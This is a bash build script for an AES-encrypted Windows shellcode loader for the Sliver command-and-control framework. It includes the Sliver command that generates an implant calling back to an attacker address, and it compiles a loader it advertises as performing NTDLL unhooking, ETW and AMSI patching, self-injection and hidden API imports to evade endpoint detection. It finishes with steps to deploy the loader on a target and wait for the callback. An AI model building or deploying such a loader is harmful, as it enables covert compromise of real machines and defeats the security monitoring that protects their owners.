#!/bin/bash
# build_hybrid_stealth.sh - Build STEALTH Hybrid EDR Loader (hidden suspicious imports)

set -e

echo "========================================="
echo "Sliver Hybrid EDR Loader Builder"
echo "STEALTH VERSION - Hidden Suspicious Imports"
echo "========================================="
echo ""

# Check for shellcode
if [ ! -f "sliver.bin" ]; then
    echo "[-] Error: sliver.bin not found!"
    echo ""
    echo "Generate it on your Sliver server:"
    echo "  sliver> generate --mtls YOUR_IP:8888 --os windows --arch amd64 --format shellcode --save /opt/Sliver_Loader/sliver.bin"
    echo ""
    exit 1
fi

echo "[+] Found sliver.bin"

# Check for MinGW
if ! command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[!] Installing MinGW-w64..."
    sudo apt update && sudo apt install -y mingw-w64
fi

# Check for pycryptodome
python3 -c "from Crypto.Cipher import AES" 2>/dev/null || {
    echo "[!] Installing pycryptodome..."
    pip3 install pycryptodome --break-system-packages 2>/dev/null || pip3 install pycryptodome
}

echo ""
echo "[+] Encrypting shellcode with AES-256..."
echo "-------------------------------------------"
python3 encrypt_hybrid_stealth.py sliver.bin loader_encrypted.cpp

echo ""
echo "[+] Compiling STEALTH hybrid loader..."
echo "-------------------------------------------"
x86_64-w64-mingw32-g++ -O2 -static -s loader_encrypted.cpp -o loader.exe -lbcrypt -lntdll

if [ -f "loader.exe" ]; then
    echo ""
    echo "========================================="
    echo "✅ SUCCESS!"
    echo "========================================="
    echo ""
    ls -lh loader.exe
    echo ""
    echo "🔒 Features:"
    echo "  ✓ AES-256-CBC encryption"
    echo "  ✓ NTDLL unhooking"
    echo "  ✓ ETW patching"
    echo "  ✓ AMSI patching"
    echo "  ✓ Self-injection (proven reliable)"
    echo "  ✓ HIDDEN IMPORTS (VirtualAlloc, CreateThread, VirtualProtect)"
    echo ""
    echo "📊 Import Improvements:"
    echo "  ✓ VirtualAlloc - HIDDEN (runtime resolution)"
    echo "  ✓ VirtualProtect - HIDDEN (runtime resolution)"
    echo "  ✓ CreateThread - HIDDEN (runtime resolution)"
    echo ""
    echo "Deploy:"
    echo "  1. Transfer loader.exe to Windows"
    echo "  2. Run: loader.exe"
    echo "  3. Check Sliver for callback"
    echo ""
    echo "Verify:"
    echo "  dumpbin /imports loader.exe"
    echo "  Should NOT see VirtualAlloc, VirtualProtect, CreateThread!"
    echo ""
else
    echo "[-] Build failed!"
    exit 1
fi
